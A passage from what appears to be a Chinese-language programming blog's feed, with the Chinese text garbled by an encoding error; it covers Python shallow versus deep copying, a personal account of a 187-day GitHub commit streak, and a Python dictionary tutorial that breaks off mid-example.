class="number">27</span>)</span><br><span class="line">p2 = p1</span><br><span class="line">p2.age = <span class="number">28</span></span><br><span class="line"><span class="built_in">print</span>(p1.age)</span><br><span class="line"><span class="built_in">print</span>(p2.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">28</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æµ…æ‹·è´</span></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">p1 = Person(<span class="string">&#x27;Alex&#x27;</span>, <span class="number">27</span>)</span><br><span class="line">p2 = copy.copy(p1)</span><br><span class="line">p2.age = <span class="number">28</span></span><br><span class="line"><span class="built_in">print</span>(p1.age)</span><br><span class="line"><span class="built_in">print</span>(p2.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">27</span></span><br><span class="line"><span class="number">28</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåµŒå¥—å¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Company</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, boss, employee</span>):</span><br><span class="line">        self. boss = boss</span><br><span class="line">        self.employee = employee</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ…æ‹·è´ä¼šå½±å“åµŒå¥—å¯¹è±¡</span></span><br><span class="line">boss = Person(<span class="string">&#x27;Jane&#x27;</span>, <span class="number">55</span>)</span><br><span class="line">employee = Person(<span class="string">&#x27;Joe&#x27;</span>, <span class="number">28</span>)</span><br><span class="line">company = Company(boss, employee)</span><br><span class="line"></span><br><span class="line">company_clone = copy.copy(company)</span><br><span class="line">company_clone.boss.age = <span class="number">56</span></span><br><span class="line"><span class="built_in">print</span>(company.boss.age)</span><br><span class="line"><span class="built_in">print</span>(company_clone.boss.age)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment"># æ·±æ‹·è´ä¸ä¼šå½±å“åµŒå¥—å¯¹è±¡</span></span><br><span class="line">boss = Person(<span class="string">&#x27;Jane&#x27;</span>, <span class="number">55</span>)</span><br><span class="line">employee = Person(<span class="string">&#x27;Joe&#x27;</span>, <span class="number">28</span>)</span><br><span class="line">company = Company(boss, employee)</span><br><span class="line">company_clone = copy.deepcopy(company)</span><br><span class="line">company_clone.boss.age = <span class="number">56</span></span><br><span class="line"><span class="built_in">print</span>(company.boss.age)</span><br><span class="line"><span class="built_in">print</span>(company_clone.boss.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">56</span></span><br><span class="line"><span class="number">56</span></span><br><span class="line"></span><br><span class="line"><span class="number">55</span></span><br><span class="line"><span class="number">56</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      20. æµ…æ‹·è´å’Œæ·±æ‹·è´ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨ Github ä¸Šâ€œè¿ç»­â€æäº¤187å¤©</title>
    <link href="https://qiwihui.com/qiwihui-blog-76/"/>
    <id>https://qiwihui.com/qiwihui-blog-76/</id>
    <published>2022-08-13T01:54:25.440Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¹Ÿæ˜¯æˆ‘å…³äºè‡ªå·±åœ¨Githubä¸Šè¿ç»­æäº¤173å¤©çš„è¿‡ç¨‹ã€‚å‡†ç¡®è¯´è¿™å¹¶ä¸æ˜¯æˆ‘è¿ç»­173å¤©åœ¨Githubæäº¤ä»£ç ï¼Œåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­æ€»å…±ä¸­æ–­äº†ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯åœ¨å†œå†å¤§å¹´ä¸‰åï¼Œå’Œå®¶äººåƒå®Œå¹´å¤œé¥­èŠå¤©å®Œå·²ç»è¿‡äº†æäº¤æ—¶é—´ç‚¹äº†ï¼Œç¬¬äºŒæ¬¡æ˜¯åœ¨3æœˆ2å·ï¼Œå®¶é‡Œçš„çŒ«å› ä¸ºç”Ÿç—…ç…§é¡¾äº†ä¸€ä¸ªæ™šä¸Šã€‚æ€»å¾—æ¥è®²è¿™æ˜¯ä¸€æ¬¡éå¸¸æœ‰æŒ‘æˆ˜ä½†æ˜¯å´æ”¶è·å¾ˆå¤§çš„è¿‡ç¨‹ã€‚</p><h2><span id="kai-shi">å¼€å§‹</span></h2><p>æ•…äº‹èµ·å› äºè‡ªæˆ‘æ‡ˆæ€ çš„æ„ŸçŸ¥ï¼Œæˆ‘åœ¨å»å¹´å¹´åº•æœ‰å¾ˆé•¿ä¸€æ®µæ—¶é—´ä¸çŸ¥é“è‡ªå·±æ”¹åšä»€ä¹ˆï¼Œå¤„åœ¨ååˆ†ç–²æƒ«çš„çŠ¶æ€ï¼Œä»¥è‡³äºåœ¨12æœˆçš„æ—¶å€™è¿ç€ä¸€å‘¨æ²¡æœ‰ä»»ä½•æäº¤ï¼ŒçŸ¥é“æˆ‘è§‰å¾—è‡ªå·±åº”è¯¥åšäº›ä»€ä¹ˆæ”¹å˜ã€‚æˆ‘æƒ³èµ·äº†å¾ˆæ—©ä¹‹å‰çš„ä¸€éåšå®¢ï¼šã€Š<a href="https://linux.cn/article-1984-1.html">æˆ‘æ³¡åœ¨GitHubä¸Šçš„177å¤©</a>ã€‹ï¼Œäºæ˜¯ï¼Œæˆ‘å†³å®šè¯•ç€å®è·µä¸€æ¬¡åœ¨ Github ä¸Šè¿›è¡Œè¿ç»­æäº¤ï¼Œä»¥æ”¹å˜è‡ªå·±çš„çŠ¶æ€ã€‚</p><!---more--><p>æˆ‘è¯•ç€æŒ‰ç…§åšå®¢ä¸­çš„çº¦å®šç»™è‡ªå·±å®šä¸‹äº†å‡ æ¡æäº¤çš„è¦æ±‚ï¼š</p><ol><li>æäº¤å¿…éœ€è¦æœ‰æ„ä¹‰ï¼Œä¸èƒ½æ˜¯ç®€å•çš„ç¼–è¾‘æ ¼å¼æˆ–è€…ä¿®æ”¹é”™å­—ï¼›</li><li>ä¸èƒ½è‡ªåŠ¨åŒ–æäº¤è¿‡ç¨‹ï¼Œä¸èƒ½ä½œå¼Šã€‚</li></ol><h2><span id="qian-ban-duan">å‰åŠæ®µ</span></h2><p>ä¸å¯å¦è®¤ï¼Œåœ¨è¿™ä¸ªè®¡åˆ’åˆšå¼€å§‹çš„æ—¶å€™çƒ­æƒ…åè¶³ï¼Œæœ‰è¿‡40ä¸ªæäº¤çš„ä¸€å¤©ï¼Œä»¥åŠå¥½äº›ä¸ªåå‡ ä¸ªæäº¤çš„æ—¥å­ï¼Œè™½ç„¶40ä¸ªæäº¤åªæ˜¯æ•´ç†åšå®¢å¸¦æ¥çš„ï¼Œä½†ä¹Ÿæ˜¯è®©æˆ‘å¾ˆæ˜¯æ¿€åŠ¨ã€‚å³ä½¿æˆ‘åœ¨å‰åŠç«¯çš„æ—¶é—´é‡Œæœ‰è¿‡ä¸¤æ¬¡ç»ˆç«¯ä¹Ÿæ²¡æœ‰å¯¹é™ä½æˆ‘çš„çƒ­æƒ…ã€‚</p><h2><span id="hou-ban-duan">ååŠæ®µ</span></h2><p>åœ¨ç¬¬60å¤©ä¹‹åï¼Œè¿™ä¸ªæŒ‘æˆ˜çš„éš¾åº¦å°±å¼€å§‹æ˜¾ç°äº†ï¼Œä¸€æ˜¯æˆ‘å¼€å§‹å‡ºç°çš„ç–²æƒ«ï¼Œå¦ä¸€ä¸ªæ˜¯å› ä¸ºæˆ‘å¼€å§‹å‡ºç°æäº¤æ¯ç«­ã€‚æˆ‘åœ¨è¿™æ¬¡æŒ‘æˆ˜ä¸­çš„æäº¤å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç±»ï¼š</p><ol><li>åšå®¢å·²ç»ç›¸åº”å¸¦æ¥çš„ä¿®æ”¹ï¼›</li><li>è‡ªå·±çš„é¡¹ç›®æƒ³æ³•çš„æäº¤ï¼Œæ¯”å¦‚ <a href="https://github.com/qiwihui/SMSFilters">SMSFilters</a>ï¼›</li><li>ã€Šå¼ºåŒ–å­¦ä¹ å¯¼è®ºï¼ˆç¬¬äºŒç‰ˆï¼‰ã€‹çš„å­¦ä¹ ç¬”è®°ï¼›</li><li>å¯¹å¼€æºé¡¹ç›®çš„è´¡çŒ®ï¼ŒåŒ…æ‹¬issueå’ŒPRï¼›</li><li>æ—¥å¸¸é˜…è¯»æ–‡ç« çš„è®°å½•ã€‚</li></ol><p>åšå®¢åˆšå¼€å§‹å†™å¾—å‹¤ï¼Œä¸€å‘¨ä¸€åˆ°ä¸¤ç¯‡ï¼Œåæ¥èƒ½ä¸¤ä¸‰å‘¨ä¸€ç¯‡å°±å·²ç»ç®—å¾ˆå¤šäº†ï¼›é¡¹ç›®çš„æƒ³æ³•ä¸å¯èƒ½ä¸€ç›´æœ‰ï¼›å­¦ä¹ ç¬”è®°è¶Šåˆ°åè¾¹è¶Šå›°éš¾ï¼Œæ¸æ¸ä¸€ç« ä¸€èŠ‚çš„æ—¶é—´å°±åŠ é•¿äº†ï¼›å¯¹å¼€æºçš„é¡¹ç›®çš„æäº¤å¹¶ä¸èƒ½éƒ½å¾—åˆ°åˆå¹¶ï¼›é˜…è¯»çš„æ–‡ç« ä¹Ÿä¸èƒ½æ€»æ˜¯è¯»åˆ°å¾ˆä¼˜ç§€çš„æ–‡ç« ã€‚æ‰€ä»¥åæ¥ï¼Œæ¯å¤©çš„æäº¤é¢‘ç‡åŸºæœ¬å¤„äºä¿åº•ã€‚</p><h2><span id="jie-shu-he-zong-jie">ç»“æŸå’Œæ€»ç»“</span></h2><p>ä»Šå¤©å†³å®šè¿™æ˜¯è¿™æ¬¡æŒ‘æˆ˜çš„æœ€åä¸€ä¸ªæäº¤ï¼Œå†™æˆä¸€éç®€çŸ­çš„åšå®¢åšä¸ºç»“æŸã€‚ç»ˆäºå¦‚é‡Šé‡è´Ÿï¼Œæ”¾ä¸‹äº†å¿ƒå¤´çš„é‡æ‹…ã€‚</p><p>æ­£å¦‚é‚£ç¯‡åšå®¢æåŠçš„ä¸€æ ·ï¼Œå¦‚æœä¸€ä¸ªå¥½ä¹ æƒ¯è¢«åˆ»æ„è¿‡åº¦éµå¾ªçš„è¯ä¹Ÿä¼šå˜æˆåäº‹ï¼›æ¯å¤©å®Œæˆçš„ä¸€ä¸ªç›®æ ‡è¿èµ·æ¥å½¢æˆä¸€æ¡é“¾æ—¶ï¼Œå®ƒä¼šæ¿€åŠ±ä½ å»ç»§ç»­å®Œæˆç›®æ ‡ï¼Œä¿æŒè¿™æ¡é“¾ä¸æ–­è£‚ã€‚</p><p>æœ€åï¼Œæˆ‘è§‰å¾—å¯¹äº Github çš„æäº¤ç»Ÿè®¡è®¡ç®—ä¹Ÿæœ‰ä¸€äº›å°çš„æç¤ºå’Œæƒ³æ³•ï¼š</p><ol><li>forkåˆ«äººçš„é¡¹ç›®ä¹Ÿæ˜¯ç®—æäº¤çš„ï¼Œå³ä½¿ä½ æ²¡ç»™åˆ«äººæäº¤PRï¼Œå¯èƒ½Githubè§‰å¾—è¿™ä¹Ÿç®—æ˜¯ä¸ºå¼€æºçš„ä¼ æ’­è´¡çŒ®äº†ä¸€ä»½åŠ›é‡å§ï¼›</li><li>æäº¤æ—¶é—´ä¸Šï¼Œåœ¨åŒ—äº¬æ—¶é—´å¤§çº¦ä¸€ç‚¹ä¹‹å‰çš„æäº¤éƒ½è¿˜ç®—æ˜¯å¤´ä¸€å¤©çš„æäº¤ï¼Œå½“ç„¶æˆ‘è§‰å¾—åœ¨è¿™ä¸ªç‚¹æäº¤ä¹Ÿæ˜¯è¦å†’æ²¡èµ¶ä¸Šçš„é£é™©çš„ï¼›</li><li>commit ä¹‹åå°±ç®—æ—¶é—´äº†ï¼Œä¸ä¸€å®šè¦é©¬ä¸Šæ¨é€åˆ°è¿œç¨‹ï¼›</li><li>å¥½çš„æƒ³æ³•ä¹Ÿç®—æ˜¯æäº¤ï¼Œå¯¹ä¸€ç¯‡æ–‡ç« çš„æƒ³æ³•ä¹Ÿå¯ä»¥åŒ…å«åœ¨å†…ã€‚</li></ol><p>æˆ‘æœ€åçš„å»ºè®®æ˜¯è¿›è¡Œä¸€æ¬¡è¿™æ ·çš„æŒ‘æˆ˜ï¼Œå¯ä»¥ç»™è‡ªå·±å¸¦æ¥ä¸€ä¸ªå¥½çš„ä¹ æƒ¯ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      åœ¨ Github ä¸Šâ€œè¿ç»­â€æäº¤187å¤©
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>03. å­—å…¸ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-120/"/>
    <id>https://qiwihui.com/qiwihui-blog-120/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>å­—å…¸æ˜¯æ— åºï¼Œå¯å˜å’Œå¯ç´¢å¼•çš„é›†åˆã€‚ å­—å…¸ç”±é”®å€¼å¯¹çš„é›†åˆç»„æˆã€‚ æ¯ä¸ªé”®å€¼å¯¹å°†é”®æ˜ å°„åˆ°å…¶å…³è”å€¼ã€‚ å­—å…¸ç”¨å¤§æ‹¬å·ä¹¦å†™ã€‚ æ¯å¯¹é”®å€¼å‡ä»¥å†’å·ï¼ˆ <code>:</code> ï¼‰åˆ†éš”ï¼Œå¹¶ä¸”å„é¡¹ä¹‹é—´ä»¥é€—å·åˆ†éš”ã€‚</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="chuang-jian-zi-dian">åˆ›å»ºå­—å…¸</span></h3><p>ä½¿ç”¨å¤§æ‹¬å·æˆ–è€…å†…ç½®çš„ <code>dict</code> å‡½æ•°åˆ›å»ºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨å­—å…¸æ„é€ å™¨ï¼Œæ³¨æ„ï¼šé”®ä¸éœ€è¦å¼•å·ã€‚</span></span><br><span class="line">my_dict_2 = <span class="built_in">dict</span>(name=<span class="string">&quot;Lisa&quot;</span>, age=<span class="number">27</span>, city=<span class="string">&quot;Boston&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_dict_2)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Boston&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="fang-wen-yuan-su">è®¿é—®å…ƒç´ </span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name_in_dict = my_dict[<span class="string">&quot;name&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(name_in_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœé”®æ²¡æœ‰æ‰¾åˆ°ï¼Œå¼•å‘ KeyError é”™è¯¯</span></span><br><span class="line"><span class="comment"># print(my_dict[&quot;lastname&quot;])</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-huo-xiu-gai-yuan-su">æ·»åŠ æˆ–ä¿®æ”¹å…ƒç´ </span></h3><p>åªéœ€æ·»åŠ æˆ–è®¿é—®é”®å¹¶åˆ†é…å€¼å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ·»åŠ æ–°é”®</span></span><br><span class="line">my_dict[<span class="string">&quot;email&quot;</span>] = <span class="string">&quot;max@xyz.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–å·²ç»å­˜åœ¨çš„é”®</span></span><br><span class="line">my_dict[<span class="string">&quot;email&quot;</span>] = <span class="string">&quot;coolmax@xyz.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;max@xyz.com&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;coolmax@xyz.com&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="shan-chu-yuan-su">åˆ é™¤å…ƒç´ </span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤é”®å€¼å¯¹</span></span><br><span class="line"><span class="keyword">del</span> my_dict[<span class="string">&quot;email&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop è¿”å›å€¼å¹¶åˆ é™¤é”®å€¼å¯¹</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;popped value:&quot;</span>, my_dict.pop(<span class="string">&quot;age&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›å¹¶ç§»é™¤æœ€åæ’å…¥çš„ä»·å€¼å¯¹</span></span><br><span class="line"><span class="comment"># ï¼ˆåœ¨ Python 3.7 ä¹‹å‰ï¼Œç§»é™¤ä»»æ„é”®å€¼å¯¹ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;popped item:&quot;</span>, my_dict.popitem())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : ç§»é™¤æ‰€æœ‰é”®å€¼å¯¹</span></span><br><span class="line"><span class="comment"># my_dict.clear()</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">popped value: <span class="number">28</span></span><br><span class="line">popped item: (<span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;New York&#x27;</span>)</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥é”®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"><span class="comment"># ä½¿ç”¨ if .. in ..</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> my_dict:</span><br><span class="line">    <span class="built_in">print</span>(my_dict[<span class="string">&quot;name&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ try except</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(my_dict[<span class="string">&quot;firstname&quot;</span>])</span><br><span class="line"><span class="keyword">except</span> KeyError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No key found&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line">No key found</span><br></pre></td></tr></table></figure><h3><span id="bian-li-zi-dian">éå†å­—å…¸</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># éå†é”®</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> my_dict:</span><br><span class="line">    <span class="built_in">print</span>(key, my_dict[key])</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†é”®</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> my_dict.keys():</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†å€¼</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> my_dict.values():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†é”®å’Œå€¼</span></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> my_dict.items():</span><br><span class="line">    <span class="built_in">print</span>(key, value)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name Max</span><br><span class="line">age <span class="number">28</span></span><br><span class="line">city New York</span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line">city</span><br><span class="line">Max</span><br><span class="line"><span class="number">28</span></span><br><span class="line">New York</span><br><span class="line">name Max</span><br><span class="line">age <span class="number">28</span></span><br><span class="line">city New York</span><br></pre></td></tr></table></figure><h3><span id="fu-zhi-zi-dian">å¤åˆ¶å­—å…¸</span></h3><p>å¤åˆ¶ç´¢å¼•æ—¶è¯·æ³¨æ„ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict_org = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™åªå¤åˆ¶å­—å…¸çš„å¼•ç”¨ï¼Œéœ€è¦å°å¿ƒ</span></span><br><span class="line">dict_copy = dict_org</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å¤åˆ¶å­—å…¸ä¹Ÿä¼šå½±å“åŸæ¥çš„å­—å…¸</span></span><br><span class="line">dict_copy[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;Lisa&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dict_copy)</span><br><span class="line"><span class="built_in">print</span>(dict_org)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ copy() æˆ–è€… dict(x) æ¥çœŸæ­£å¤åˆ¶å­—å…¸</span></span><br><span class="line">dict_org = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">dict_copy = dict_org.copy()</span><br><span class="line"><span class="comment"># dict_copy = dict(dict_org)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ä¿®æ”¹å¤åˆ¶å­—å…¸ä¸ä¼šå½±å“åŸæ¥çš„å­—å…¸</span></span><br><span class="line">dict_copy[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;Lisa&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dict_copy)</span><br><span class="line"><span class="built_in">print</span>(dict_org)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="he-bing-liang-ge-zi-dian">åˆå¹¶ä¸¤ä¸ªå­—å…¸</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ update() æ–¹æ³•åˆä¸¤ä¸ªå­—å…¸</span></span><br><span class="line"><span class="comment"># å­˜åœ¨çš„é”®ä¼šè¢«è¦†ç›–ï¼Œæ–°é”®ä¼šè¢«æ·»åŠ </span></span><br><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;email&quot;</span>:<span class="string">&quot;max@xyz.com&quot;</span>&#125;</span><br><span class="line">my_dict_2 = <span class="built_in">dict</span>(name=<span class="string">&quot;Lisa&quot;</span>, age=<span class="number">27</span>, city=<span class="string">&quot;Boston&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_dict.update(my_dict_2)</span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;max@xyz.com&#x27;</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Boston&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="ke-neng-de-jian-lei-xing">å¯èƒ½çš„é”®ç±»å‹</span></h3><p>ä»»ä½•ä¸å¯å˜çš„ç±»å‹ï¼ˆä¾‹å¦‚å­—ç¬¦ä¸²æˆ–æ•°å­—ï¼‰éƒ½å¯ä»¥ç”¨ä½œé”®ã€‚ å¦å¤–ï¼Œå¦‚æœå…ƒç»„ä»…åŒ…å«ä¸å¯å˜å…ƒç´ ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å®ƒä½œä¸ºé”®ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨æ•°å­—åšé”®ï¼Œä½†è¦å°å¿ƒ</span></span><br><span class="line">my_dict = &#123;<span class="number">3</span>: <span class="number">9</span>, <span class="number">6</span>: <span class="number">36</span>, <span class="number">9</span>:<span class="number">81</span>&#125;</span><br><span class="line"><span class="comment"># ä¸è¦å°†é”®è¯¯è®¤ä¸ºæ˜¯åˆ—è¡¨çš„ç´¢å¼•ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿™é‡Œæ— æ³•ä½¿ç”¨ my_dict[0]</span></span><br><span class="line"><span class="built_in">print</span>(my_dict[<span class="number">3</span>], my_dict[<span class="number">6</span>], my_dict[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ä»…åŒ…å«ä¸å¯å˜å…ƒç´ ï¼ˆä¾‹å¦‚æ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼‰çš„å…ƒç»„</span></span><br><span class="line">my_tuple = (<span class="number">8</span>, <span class="number">7</span>)</span><br><span class="line">my_dict = &#123;my_tuple: <span class="number">15</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_dict[my_tuple])</span><br><span class="line"><span class="comment"># 